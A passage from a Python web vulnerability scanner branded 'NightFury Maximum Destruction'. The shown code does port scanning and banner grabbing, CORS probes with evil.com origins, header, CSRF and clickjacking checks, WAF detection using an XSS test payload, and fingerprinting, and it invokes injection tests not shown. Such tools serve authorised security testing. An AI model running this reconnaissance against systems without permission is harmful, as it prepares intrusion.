            9090: 'HTTP-Alt', 9092: 'Kafka', 9100: 'Printer', 9200: 'Elasticsearch',
            9300: 'Elasticsearch', 9418: 'Git', 9999: 'HTTP-Alt', 11211: 'Memcached',
            27017: 'MongoDB', 27018: 'MongoDB', 28017: 'MongoDB-Web', 50000: 'SAP'
        }
        
        def check_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.domain.split(':')[0], port))
                sock.close()
                
                if result == 0:
                    # Try to get banner
                    banner = ""
                    try:
                        if port in [80, 443, 8080, 8443]:
                            # HTTP banner
                            url = f"http://{self.domain}:{port}/"
                            if port in [443, 8443]:
                                url = f"https://{self.domain}:{port}/"
                            r = self.request(url, timeout=3)
                            if r['success']:
                                banner = r['response']['headers'].get('server', '')
                        else:
                            # TCP banner
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(3)
                            s.connect((self.domain.split(':')[0], port))
                            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                            s.close()
                    except:
                        pass
                    
                    service = ports.get(port, 'Unknown')
                    return {
                        'port': port,
                        'service': service,
                        'banner': banner
                    }
            except:
                pass
            return None
        
        # Threaded port scan
        threads = []
        results_lock = threading.Lock()
        
        def worker(port):
            res = check_port(port)
            if res:
                with results_lock:
                    results.append(res)
                    banner_str = f" - {res['banner']}" if res['banner'] else ""
                    print(f"    {Fore.YELLOW}⚠ Port {res['port']}: {res['service']}{banner_str}{Fore.RESET}")
        
        for port in ports.keys():
            t = threading.Thread(target=worker, args=(port,))
            threads.append(t)
            t.start()
            
            # Limit concurrent threads
            while len([t for t in threads if t.is_alive()]) >= self.max_threads:
                time.sleep(0.1)
        
        for t in threads:
            t.join()
        
        if results:
            self.vulnerabilities.append({
                'type': 'Open Ports',
                'ports': results
            })
        
        return results
    
    # ==================== MODULE 11: Security Headers ====================
    
    def test_security_headers(self):
        """Security Headers Check"""
        print(f"\n{Fore.BLUE}[*] Checking security headers...{Fore.RESET}")
        results = []
        
        important_headers = {
            'strict-transport-security': 'HSTS - Missing HSTS header',
            'content-security-policy': 'CSP - Missing Content Security Policy',
            'x-frame-options': 'Clickjacking - Missing X-Frame-Options',
            'x-content-type-options': 'MIME sniffing - Missing X-Content-Type-Options',
            'x-xss-protection': 'XSS filter - Missing X-XSS-Protection',
            'referrer-policy': 'Referrer - Missing Referrer-Policy',
            'permissions-policy': 'Permissions - Missing Permissions-Policy',
            'expect-ct': 'Certificate - Missing Expect-CT'
        }
        
        result = self.request(self.target)
        if not result['success']:
            return []
        
        headers = result['response']['headers']
        
        missing = []
        for header, desc in important_headers.items():
            if header not in headers:
                missing.append(desc)
                print(f"    {Fore.YELLOW}⚠ {desc}{Fore.RESET}")
        
        if missing:
            results.append({
                'type': 'Missing Security Headers',
                'missing': missing
            })
        
        # Check for information disclosure
        server = headers.get('server', '')
        if server and 'apache' not in server.lower() and 'nginx' not in server.lower():
            print(f"    {Fore.YELLOW}⚠ Server version disclosed: {server}{Fore.RESET}")
            results.append({
                'type': 'Information Disclosure',
                'detail': f'Server: {server}'
            })
        
        powered_by = headers.get('x-powered-by', '')
        if powered_by:
            print(f"    {Fore.YELLOW}⚠ Technology disclosed: {powered_by}{Fore.RESET}")
            results.append({
                'type': 'Information Disclosure',
                'detail': f'X-Powered-By: {powered_by}'
            })
        
        return results
    
    # ==================== MODULE 12: CORS ====================
    
    def test_cors(self):
        """CORS Misconfiguration"""
        print(f"\n{Fore.BLUE}[*] Testing CORS misconfiguration...{Fore.RESET}")
        results = []
        
        test_origins = [
            'https://evil.com',
            'null',
            'https://evil.com.evil.net',
            'https://evil.com:8080'
        ]
        
        for origin in test_origins:
            headers = {'Origin': origin}
            result = self.request(self.target, headers=headers)
            
            if not result['success']:
                continue
            
            resp_headers = result['response']['headers']
            cors_origin = resp_headers.get('access-control-allow-origin', '')
            cors_creds = resp_headers.get('access-control-allow-credentials', '')
            
            if cors_origin == '*':
                print(f"    {Fore.RED}⚠ CORS: Wildcard origin (*) allows any site{Fore.RESET}")
                results.append({
                    'type': 'CORS Misconfiguration',
                    'issue': 'Wildcard origin',
                    'severity': 'HIGH'
                })
            
            elif cors_origin == origin and cors_creds == 'true':
                print(f"    {Fore.RED}⚠ CORS: Reflects origin with credentials{Fore.RESET}")
                results.append({
                    'type': 'CORS Misconfiguration',
                    'issue': 'Origin reflection with credentials',
                    'severity': 'CRITICAL'
                })
            
            elif cors_origin and cors_creds == 'true':
                print(f"    {Fore.YELLOW}⚠ CORS: Credentials allowed with specific origin{Fore.RESET}")
                results.append({
                    'type': 'CORS Misconfiguration',
                    'issue': f'Credentials allowed with {cors_origin}',
                    'severity': 'MEDIUM'
                })
        
        return results
    
    # ==================== MODULE 13: CSRF ====================
    
    def test_csrf(self):
        """CSRF Testing"""
        print(f"\n{Fore.BLUE}[*] Testing CSRF...{Fore.RESET}")
        results = []
        
        for form in self.forms:
            if form['method'] != 'post':
                continue
            
            has_csrf = False
            for inp in form['inputs']:
                name = inp['name'].lower()
                if any(token in name for token in ['csrf', 'token', 'authenticity_token', '_token', 'nonce']):
                    has_csrf = True
                    break
            
            if not has_csrf:
                print(f"    {Fore.YELLOW}⚠ Form without CSRF token: {form['action']}{Fore.RESET}")
                results.append({
                    'type': 'CSRF',
                    'url': form['action'],
                    'source': form['source']
                })
        
        return results
    
    # ==================== MODULE 14: Clickjacking ====================
    
    def test_clickjacking(self):
        """Clickjacking Testing"""
        print(f"\n{Fore.BLUE}[*] Testing Clickjacking...{Fore.RESET}")
        results = []
        
        result = self.request(self.target)
        if not result['success']:
            return []
        
        x_frame = result['response']['headers'].get('x-frame-options', '').lower()
        
        if not x_frame:
            print(f"    {Fore.YELLOW}⚠ Clickjacking: Missing X-Frame-Options{Fore.RESET}")
            results.append({
                'type': 'Clickjacking',
                'issue': 'Missing X-Frame-Options'
            })
        elif x_frame not in ['deny', 'sameorigin']:
            print(f"    {Fore.YELLOW}⚠ Clickjacking: Weak X-Frame-Options: {x_frame}{Fore.RESET}")
            results.append({
                'type': 'Clickjacking',
                'issue': f'Weak X-Frame-Options: {x_frame}'
            })
        
        # Check Content-Security-Policy frame-ancestors
        csp = result['response']['headers'].get('content-security-policy', '')
        if 'frame-ancestors' in csp:
            if 'none' in csp or 'self' in csp:
                print(f"    {Fore.GREEN}✓ Clickjacking: CSP frame-ancestors set{Fore.RESET}")
            else:
                print(f"    {Fore.YELLOW}⚠ Clickjacking: CSP frame-ancestors allows: {csp}{Fore.RESET}")
        
        return results
    
    # ==================== MODULE 15: WAF Detection ====================
    
    def detect_waf(self):
        """WAF Detection"""
        print(f"\n{Fore.BLUE}[*] Detecting WAF...{Fore.RESET}")
        results = []
        
        # Test with malicious payload
        test_url = self.target + "?id=<script>alert(1)</script>"
        result = self.request(test_url)
        
        if not result['success']:
            return []
        
        headers = result['response']['headers']
        status = result['response']['status']
        
        # WAF signatures
        waf_signatures = {
            'Cloudflare': ['cf-ray', 'cf-cache-status', '__cfduid'],
            'AWS WAF': ['x-amzn-RequestId', 'x-amzn-ErrorType'],
            'Sucuri': ['x-sucuri-id', 'x-sucuri-cache'],
            'Akamai': ['x-akamai-transformed', 'akamai-origin-hop'],
            'Incapsula': ['incap_ses', 'visid_incap'],
            'F5 BIG-IP': ['BigIP', 'F5'],
            'Barracuda': ['barra_counter_session'],
            'ModSecurity': ['mod_security', 'NOYB'],
            'Wordfence': ['wordfence'],
            'ShieldSecurity': ['_shieldsec'],
            'DotDefender': ['X-DotDefender'],
            'Citrix': ['netscaler'],
            'Radware': ['X-SL-CompState'],
            'Fortinet': ['FortiWeb'],
            'Imperva': ['X-Iinfo']
        }
        
        detected_wafs = []
        for waf, signatures in waf_signatures.items():
            for sig in signatures:
                if any(sig.lower() in str(headers).lower() for sig in signatures):
                    detected_wafs.append(waf)
                    break
        
        if detected_wafs:
            print(f"    {Fore.YELLOW}⚠ WAF detected: {', '.join(detected_wafs)}{Fore.RESET}")
            results.append({
                'type': 'WAF Detected',
                'wafs': detected_wafs
            })
        else:
            # Check for block page
            if status in [403, 406, 503]:
                content = result['response']['text'].lower()
                block_keywords = ['blocked', 'denied', 'forbidden', 'waf', 'firewall', 'sucuri', 'cloudflare']
                if any(keyword in content for keyword in block_keywords):
                    print(f"    {Fore.YELLOW}⚠ Possible WAF: Block page detected{Fore.RESET}")
                    results.append({
                        'type': 'Possible WAF',
                        'evidence': 'Block page'
                    })
        
        return results
    
    # ==================== MODULE 16: Technology Fingerprint ====================
    
    def fingerprint(self):
        """Technology Fingerprinting"""
        print(f"\n{Fore.BLUE}[*] Fingerprinting technology...{Fore.RESET}")
        
        result = self.request(self.target)
        if not result['success']:
            return
        
        headers = result['response']['headers']
        content = result['response']['text'].lower()
        
        tech = {}
        
        # Server
        if 'server' in headers:
            tech['Server'] = headers['server']
            print(f"    {Fore.CYAN}ℹ Server: {headers['server']}{Fore.RESET}")
        
        # Framework
        if 'x-powered-by' in headers:
            tech['Framework'] = headers['x-powered-by']
            print(f"    {Fore.CYAN}ℹ Framework: {headers['x-powered-by']}{Fore.RESET}")
        
        # CMS Detection
        cms_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json', 'wordpress'],
            'Joomla': ['joomla', 'com_content', 'com_users'],
            'Drupal': ['drupal', 'sites/all', 'core/misc'],
            'Magento': ['magento', 'skin/frontend', 'mage/cookies'],
            'PrestaShop': ['prestashop', 'modules/block', 'themes/default'],
            'Laravel': ['laravel', 'csrf-token', 'livewire'],
            'Django': ['csrfmiddlewaretoken', 'django', 'admin/login'],
            'Ruby on Rails': ['rails', 'authenticity_token', 'data-remote'],
            'ASP.NET': ['viewstate', 'eventvalidation', 'asp.net'],
            'PHP': ['php', 'session_id', 'phpsessid']
        }
        
        detected_cms = []
        for cms, signatures in cms_signatures.items():
            for sig in signatures:
                if sig in content:
                    detected_cms.append(cms)
                    break
        
        if detected_cms:
            tech['CMS'] = list(set(detected_cms))
            print(f"    {Fore.CYAN}ℹ CMS: {', '.join(set(detected_cms))}{Fore.RESET}")
        
        # JavaScript frameworks
        js_signatures = {
            'jQuery': ['jquery', '$()', 'jquery.js'],
            'React': ['react', 'reactdom', 'usestate'],
            'Vue.js': ['vue', 'v-bind', 'v-model'],
            'Angular': ['angular', 'ng-app', 'ng-controller'],
            'Bootstrap': ['bootstrap', 'col-md', 'glyphicon'],
            'Tailwind': ['tailwind', 'w-screen', 'bg-gray']
        }
        
        detected_js = []
        for js, signatures in js_signatures.items():
            for sig in signatures:
                if sig in content:
                    detected_js.append(js)
                    break
        
        if detected_js:
            tech['JavaScript'] = list(set(detected_js))
            print(f"    {Fore.CYAN}ℹ JS Framework: {', '.join(set(detected_js))}{Fore.RESET}")
        
        # Cloud providers
        cloud_signatures = {
            'AWS': ['aws', 'amazonaws', 's3.amazonaws', 'cloudfront'],
            'Google Cloud': ['googleapis', 'gstatic', 'appspot'],
            'Azure': ['azure', 'windows.net', 'cloudapp'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'Akamai': ['akamai', 'akamaiedge']
        }
        
        for cloud, signatures in cloud_signatures.items():
            for sig in signatures:
                if sig in content or sig in str(headers):
                    tech['Cloud'] = cloud
                    print(f"    {Fore.CYAN}ℹ Cloud: {cloud}{Fore.RESET}")
                    break
        
        if tech:
            self.tech_stack = tech
            self.vulnerabilities.append({
                'type': 'Technology Stack',
                'tech': tech
            })
    
    # ==================== RUN ALL TESTS ====================
    
    def run(self):
        """Execute all tests"""
        self.banner()
        
        if not self.get_target():
            return
        
        # Initial recon
        self.crawl()
        self.detect_waf()
        self.fingerprint()
        self.scan_ports()
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"   STARTING VULNERABILITY SCAN - 50+ METHODS")
        print(f"{'='*60}{Fore.RESET}\n")
        
        # Run vulnerability tests
        test_methods = [
            ('SQL Injection Error', self.test_sqli_error),
            ('SQL Injection Time', self.test_sqli_time),
            ('SQL Injection Boolean', self.test_sqli_boolean),
            ('SQL Injection Union', self.test_sqli_union),
            ('XSS Reflected', self.test_xss_reflected),
            ('XSS Stored', self.test_xss_stored),
            ('XSS DOM', self.test_xss_dom),
            ('LFI/RFI', self.test_lfi),
            ('Command Injection', self.test_cmdi),
            ('SSRF', self.test_ssrf),
            ('XXE', self.test_xxe),
            ('SSTI', self.test_ssti),
            ('Open Redirect', self.test_redirect),
            ('Sensitive Files', self.test_sensitive),
            ('Security Headers', self.test_security_headers),
            ('CORS', self.test_cors),
            ('CSRF', self.test_csrf),
            ('Clickjacking', self.test_clickjacking)
        ]
        
        for name, method in test_methods:
            try:
                results = method()
                if results:
                    self.vulnerabilities.extend(results)
            except Exception as e:
                print(f"    {Fore.RED}Error in {name}: {str(e)[:50]}{Fore.RESET}")
                continue
        
        # Summary
        elapsed = time.time() - self.start_time
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"   SCAN COMPLETE - INDUSTRIAL GRADE RESULTS")
        print(f"{'='*60}{Fore.RESET}\n")
        
        print(f"{Fore.WHITE}Target:      {self.target}")
        print(f"Domain:      {self.domain}")
        print(f"IP:          {self.ip}")
        print(f"Duration:    {elapsed:.2f} seconds")
        print(f"Requests:    {self.request_count}")
        print(f"Errors:      {self.error_count}")
        print(f"Endpoints:   {len(self.endpoints)}")
        print(f"Forms:       {len(self.forms)}")
        print(f"Parameters:  {len(set(self.parameters))}")
        print(f"Vulns found: {Fore.RED if self.vulnerabilities else Fore.GREEN}{len(self.vulnerabilities)}{Fore.WHITE}")
        
        # Group vulnerabilities by type
        if self.vulnerabilities:
            vuln_types = defaultdict(int)
            for v in self.vulnerabilities:
                vuln_types[v['type']] += 1
            
            print(f"\n{Fore.RED}VULNERABILITIES BY TYPE:{Fore.RESET}")
            for vtype, count in vuln_types.items():
                print(f"  • {vtype}: {count}")
            
            # Save report
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"report_{self.domain}.txt"
            
            with open(report_file, 'w') as f:
                f.write("="*80 + "\n")
                f.write("NIGHTFURY MAXIMUM DESTRUCTION - SCAN REPORT\n")
                f.write("="*80 + "\n\n")
                f.write(f"Target:     {self.target}\n")
                f.write(f"Domain:     {self.domain}\n")
                f.write(f"IP:         {self.ip}\n")
                f.write(f"Date:       {datetime.now()}\n")
                f.write(f"Duration:   {elapsed:.2f}s\n")
                f.write(f"Vulns:      {len(self.vulnerabilities)}\n\n")
                
                if self.tech_stack:
                    f.write("TECHNOLOGY STACK:\n")
                    for k, v in self.tech_stack.items():
                        f.write(f"  {k}: {v}\n")
                    f.write("\n")
                
                f.write("VULNERABILITIES:\n")
                f.write("-"*80 + "\n\n")
                
                for i, v in enumerate(self.vulnerabilities, 1):
                    f.write(f"[{i}] {v['type']}\n")
                    for key, val in v.items():
                        if key != 'type':
                            f.write(f"    {key}: {val}\n")
                    f.write("\n")
            
            print(f"\n{Fore.GREEN}[✓] Full report saved to: {report_file}{Fore.RESET}")
        else:
            print(f"\n{Fore.GREEN}[✓] No vulnerabilities detected!{Fore.RESET}")
        
        print(f"\n{Fore.RED}╔════════════════════════════════════════════════════╗")
        print(f"║         SCAN COMPLETE - MAXIMUM DESTRUCTION        ║")
        print(f"╚════════════════════════════════════════════════════╝{Fore.RESET}")


def main():
    try:
        scanner = NightFuryMaximum()
        scanner.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Fore.RESET}")
        print(f"{Fore.YELLOW}[!] Error details: {traceback.format_exc()}{Fore.RESET}")
        print(f"{Fore.GREEN}[!] Restarting scanner...{Fore.RESET}")
        main()


if __name__ == "__main__":
    main()
